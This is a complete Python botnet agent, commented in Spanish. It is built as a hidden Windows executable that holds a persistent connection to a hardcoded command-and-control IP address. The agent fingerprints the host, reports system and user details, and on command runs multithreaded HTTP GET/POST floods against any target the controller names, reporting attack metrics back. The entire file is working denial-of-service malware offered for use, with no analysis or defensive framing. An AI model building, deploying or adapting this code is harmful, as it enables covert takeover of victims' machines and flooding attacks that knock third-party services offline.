#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Agente zombie.

- Conexión TCP persistente al C2 con reconexión infinita y backoff con jitter.
- client_id estable por equipo (hostname + MAC + MachineGuid).
- Heartbeat cada 20 s. Nunca se desconecta voluntariamente.
- Atiende PING, INFO, FLOOD, STOP y kick.
- Inunda el objetivo y le reporta las métricas al servidor.

Sin ventana de consola. Build:
  pyinstaller --onefile --noconsole --name agente agente.py
"""

import ctypes
import hashlib
import json
import logging
import os
import platform
import random
import socket
import sys
import threading
import time
import uuid

# ------------------------------------------------------------------ #
# Parámetros (sobreescribibles con config.ini junto al ejecutable)
# ------------------------------------------------------------------ #

SERVER_HOST = "54.80.230.134"
SERVER_PORT = 4024
HEARTBEAT_INTERVAL = 20.0
RECV_TIMEOUT = 5.0
BACKOFF_BASE = 1.0
BACKOFF_MAX = 60.0
KICK_COOLDOWN = 25.0
REPORTE_INTERVALO = 2.0

MUTEX = "Global\\AgenteZombieMutex_v1"
BASE_DIR = os.path.dirname(os.path.abspath(sys.argv[0]))
LOG_DIR = os.path.join(os.environ.get("LOCALAPPDATA", os.environ.get("TEMP", ".")), "agente")
os.makedirs(LOG_DIR, exist_ok=True)

logging.basicConfig(
    filename=os.path.join(LOG_DIR, "agente.log"),
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)

ES_WINDOWS = os.name == "nt"


# ------------------------------------------------------------------ #
# Utilidades
# ------------------------------------------------------------------ #

def cargar_config():
    global SERVER_HOST, SERVER_PORT
    ruta = os.path.join(BASE_DIR, "config.ini")
    if not os.path.exists(ruta):
        return
    for linea in open(ruta, encoding="utf-8"):
        linea = linea.strip()
        if not linea or linea.startswith("#") or "=" not in linea:
            continue
        k, v = linea.split("=", 1)
        k, v = k.strip().upper(), v.strip()
        if k == "SERVER_HOST":
            SERVER_HOST = v
        elif k == "SERVER_PORT":
            SERVER_PORT = int(v)


def instancia_unica() -> bool:
    if not ES_WINDOWS:
        return True
    handle = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX)
    if ctypes.windll.kernel32.GetLastError() == 183:   # ERROR_ALREADY_EXISTS
        return False
    globals()["_MUTEX_HANDLE"] = handle
    return True


def _machine_guid() -> str:
    if not ES_WINDOWS:
        return ""
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                            r"SOFTWARE\Microsoft\Cryptography") as k:
            return str(winreg.QueryValueEx(k, "MachineGuid")[0])
    except Exception:
        return ""


def id_persistente() -> str:
    semilla = "|".join([platform.node(), str(uuid.getnode()), _machine_guid()])
    return hashlib.sha256(semilla.encode("utf-8")).hexdigest()[:16]


def info_sistema() -> dict:
    datos = {
        "hostname": platform.node(),
        "os": "{} {}".format(platform.system(), platform.release()),
        "arquitectura": platform.machine(),
        "usuario": os.environ.get("USERNAME") or os.environ.get("USER"),
        "procesador": platform.processor(),
        "nucleos": os.cpu_count(),
    }
    if ES_WINDOWS:
        class MEMSTAT(ctypes.Structure):
            _fields_ = [("dwLength", ctypes.c_ulong),
                        ("dwMemoryLoad", ctypes.c_ulong),
                        ("ullTotalPhys", ctypes.c_ulonglong),
                        ("ullAvailPhys", ctypes.c_ulonglong),
                        ("ullTotalPageFile", ctypes.c_ulonglong),
                        ("ullAvailPageFile", ctypes.c_ulonglong),
                        ("ullTotalVirtual", ctypes.c_ulonglong),
                        ("ullAvailVirtual", ctypes.c_ulonglong),
                        ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
        est = MEMSTAT()
        est.dwLength = ctypes.sizeof(MEMSTAT)
        try:
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(est))
            datos["ram_total_mb"] = est.ullTotalPhys // (1024 * 1024)
            datos["ram_libre_mb"] = est.ullAvailPhys // (1024 * 1024)
        except Exception:
            pass
    return datos


# ------------------------------------------------------------------ #
# Inundador
# ------------------------------------------------------------------ #

class Inundador:
    def __init__(self, host, puerto, hilos, duracion, metodo, reportar):
        self.host = host
        self.puerto = int(puerto)
        self.hilos = max(1, min(int(hilos), 500))
        self.duracion = float(duracion or 0)
        self.metodo = (metodo or "GET").upper()
        self.reportar = reportar
        self.enviadas = 0
        self.errores = 0
        self.bytes = 0
        self.lock = threading.Lock()
        self._stop = threading.Event()
        self._hilos = []
        self.inicio = None
        self.fin = None

    def arrancar(self):
        self.inicio = time.time()
        self.fin = self.inicio + self.duracion if self.duracion > 0 else None
        for _ in range(self.hilos):
            h = threading.Thread(target=self._trabajador, daemon=True)
            h.start()
            self._hilos.append(h)
        threading.Thread(target=self._reporte_loop, daemon=True).start()
        logging.info("Inundación %s:%s hilos=%s dur=%ss",
                     self.host, self.puerto, self.hilos, self.duracion)

    def parar(self) -> dict:
        self._stop.set()
        resumen = self.resumen()
        logging.info("Inundación detenida: %s", resumen)
        return resumen

    def resumen(self) -> dict:
        with self.lock:
            return {"enviadas": self.enviadas, "errores": self.errores,
                    "bytes": self.bytes,
                    "segundos": round(time.time() - self.inicio, 1) if self.inicio else 0}

    def _peticion(self) -> bytes:
        if self.metodo == "POST":
            cuerpo = "a=" + "x" * 256
            return ("POST / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0\r\n"
                    "Content-Type: application/x-www-form-urlencoded\r\n"
                    "Content-Length: {}\r\nConnection: close\r\n\r\n{}"
                    .format(self.host, len(cuerpo), cuerpo)).encode()
        return ("GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0\r\n"
                "Accept: */*\r\nConnection: close\r\n\r\n".format(self.host)).encode()

    def _trabajador(self):
        peticion = self._peticion()
        while not self._stop.is_set():
            if self.fin and time.time() >= self.fin:
                break
            s = None
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3.0)
                s.connect((self.host, self.puerto))
                s.sendall(peticion)
                while True:
                    trozo = s.recv(4096)
                    if not trozo:
                        break
                    with self.lock:
                        self.bytes += len(trozo)
                with self.lock:
                    self.enviadas += 1
            except Exception:
                with self.lock:
                    self.errores += 1
            finally:
                if s:
                    try:
                        s.close()
                    except OSError:
                        pass

    def _reporte_loop(self):
        while not self._stop.is_set():
            time.sleep(REPORTE_INTERVALO)
            if self._stop.is_set():
                break
            self.reportar(self.resumen())


# ------------------------------------------------------------------ #
# Agente
# ------------------------------------------------------------------ #

class Agente:
    def __init__(self):
        self.sock = None
        self.running = True
        self.session_active = False
        self.write_lock = threading.Lock()
        self.inundador = None
        self.cmd_flood = None
        self.cooldown_hasta = 0.0

    def run_forever(self):
        intento = 0
        while self.running:
            espera = self.cooldown_hasta - time.time()
            if espera > 0:
                time.sleep(espera)
            try:
                self._conectar_y_servir()
                intento = 0
            except Exception as exc:
                logging.warning("Conexión perdida o fallida: %s", exc)
            self.session_active = False
            if self.inundador:
                self.inundador.parar()
                self.inundador = None
            if not self.running:
                break
            intento += 1
            retardo = min(BACKOFF_MAX, BACKOFF_BASE * (2 ** intento))
            retardo += random.uniform(0, retardo * 0.3)
            logging.info("Reintento en %.1fs (intento %s)", retardo, intento)
            time.sleep(retardo)

    def _conectar_y_servir(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10.0)
        self.sock.connect((SERVER_HOST, SERVER_PORT))
        self.sock.settimeout(RECV_TIMEOUT)
        logging.info("Conectado a %s:%s como %s", SERVER_HOST, SERVER_PORT, CLIENT_ID)

        self._send(self.sock, {
            "type": "hello",
            "client_id": CLIENT_ID,
            "hostname": HOSTNAME,
            "os": OS_INFO,
            "proto_version": 2,
        })

        self.session_active = True
        threading.Thread(target=self._heartbeat_loop, daemon=True).start()

        buffer = ""
        while self.running and self.session_active:
            try:
                datos = self.sock.recv(4096)
                if not datos:
                    raise ConnectionResetError("servidor cerró la conexión")
                buffer += datos.decode("utf-8", errors="replace")
                while "\n" in buffer:
                    linea, buffer = buffer.split("\n", 1)
                    linea = linea.strip()
                    if linea:
                        self._handle_message(json.loads(linea))
            except socket.timeout:
                continue

    def _heartbeat_loop(self):
        while self.running and self.session_active:
            time.sleep(HEARTBEAT_INTERVAL)
            if self.session_active:
                self._send(self.sock, {"type": "heartbeat"})

    def _handle_message(self, msg: dict):
        tipo = msg.get("type")
        if tipo == "welcome":
            logging.info("Sesión confirmada, server_time=%s", msg.get("server_time"))
        elif tipo == "heartbeat_ack":
            pass
        elif tipo == "command":
            self._handle_command(msg.get("cmd", ""), msg.get("cmd_id", ""),
                                 msg.get("payload") or {})
        elif tipo == "kick":
            logging.info("Expulsado: %s", msg.get("reason"))
            self.session_active = False
            self.cooldown_hasta = time.time() + KICK_COOLDOWN
        else:
            logging.info("Mensaje no reconocido: %s", msg)

    def _handle_command(self, cmd: str, cmd_id: str, payload: dict):
        cmd = (cmd or "").upper()
        logging.info("Comando %s id=%s payload=%s", cmd, cmd_id, payload)

        if cmd == "PING":
            self._send(self.sock, {"type": "ack", "cmd_id": cmd_id, "estado": "vivo"})

        elif cmd == "INFO":
            self._send(self.sock, {"type": "ack", "cmd_id": cmd_id,
                                   "estado": "ok", "payload": info_sistema()})

        elif cmd == "FLOOD":
            if self.inundador:
                self.inundador.parar()
            self.cmd_flood = cmd_id
            self.inundador = Inundador(
                payload.get("host", ""), payload.get("port", 80),
                payload.get("threads", 50), payload.get("duration", 30),
                payload.get("method", "GET"), self._reportar_metricas)
            self.inundador.arrancar()
            self._send(self.sock, {"type": "ack", "cmd_id": cmd_id,
                                   "estado": "inundando",
                                   "payload": {"objetivo": "{}:{}".format(
                                       payload.get("host"), payload.get("port"))}})

        elif cmd == "STOP":
            resumen = self.inundador.parar() if self.inundador else {"enviadas": 0}
            self.inundador = None
            self._send(self.sock, {"type": "ack", "cmd_id": cmd_id,
                                   "estado": "detenido", "payload": resumen})

        else:
            self._send(self.sock, {"type": "ack", "cmd_id": cmd_id,
                                   "estado": "desconocido"})

    def _reportar_metricas(self, resumen: dict):
        if not self.session_active:
            return
        self._send(self.sock, {"type": "metricas", "cmd_id": self.cmd_flood or "",
                               "payload": resumen})

    def _send(self, sock: socket.socket, obj: dict) -> bool:
        payload = (json.dumps(obj, ensure_ascii=False) + "\n").encode("utf-8")
        with self.write_lock:
            try:
                sock.sendall(payload)
                return True
            except OSError as exc:
                logging.warning("Fallo al enviar: %s", exc)
                self.session_active = False
                return False

    @staticmethod
    def _safe_close(sock: socket.socket):
        try:
            sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            sock.close()
        except OSError:
            pass


# ------------------------------------------------------------------ #
# Arranque
# ------------------------------------------------------------------ #

CLIENT_ID = id_persistente()
HOSTNAME = platform.node()
OS_INFO = "{} {}".format(platform.system(), platform.release())


def main():
    cargar_config()
    if not instancia_unica():
        logging.info("Ya hay una instancia corriendo.")
        return

    logging.info("Inicio id=%s host=%s os=%s", CLIENT_ID, HOSTNAME, OS_INFO)
    agente = Agente()
    try:
        agente.run_forever()
    except KeyboardInterrupt:
        agente.running = False
        agente.session_active = False
        if agente.inundador:
            agente.inundador.parar()
        time.sleep(0.5)
        sys.exit(0)


if __name__ == "__main__":
    main()
